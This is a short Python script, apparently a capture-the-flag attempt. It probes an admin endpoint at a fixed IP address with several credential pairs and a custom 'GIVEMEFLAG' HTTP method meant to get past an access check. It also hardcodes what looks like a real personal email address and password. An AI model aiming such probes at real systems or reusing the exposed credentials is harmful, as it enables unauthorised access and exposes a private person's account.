import requests
import json

login_url = 'http://140.115.59.7:12002/admin'
# login_url = 'http://140.115.59.7:12002/admin?username=hitori&password=🤘rockyou!!!'
# login_url = 'http://140.115.59.7:12002/admin?username=hitori&password=rockyou!!!'
login_url = 'http://140.115.59.7:12002/admin?username=robin0623.hsieh@gmail.com&password=En+447459209289'

# login_headers = {
    # 'Content-Type': 'application/json'
# }

# login_data = {
    # 'username': 'robin0623.hsieh@gmail.com',
    # 'password': 'En+447459209289'
# }

# login_data = json.dumps({
    # 'username': 'robin0623.hsieh@gmail.com',
    # 'password': 'En+447459209289'
# })

# login_data = {
    # 'username': 'hitori',
    # 'password': '🤘rockyou!!!'
# }

# login_data = json.dumps({
    # 'username': 'hitori',
    # 'password': '🤘rockyou!!!'
# })

# response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, data=login_data)
# response = requests.request("GIVEMEFLAG", login_url, data=login_data)
response = requests.request("GIVEMEFLAG", login_url)
# response = requests.request("POST", login_url)
# response = requests.request("GET", login_url)

print(response.text)

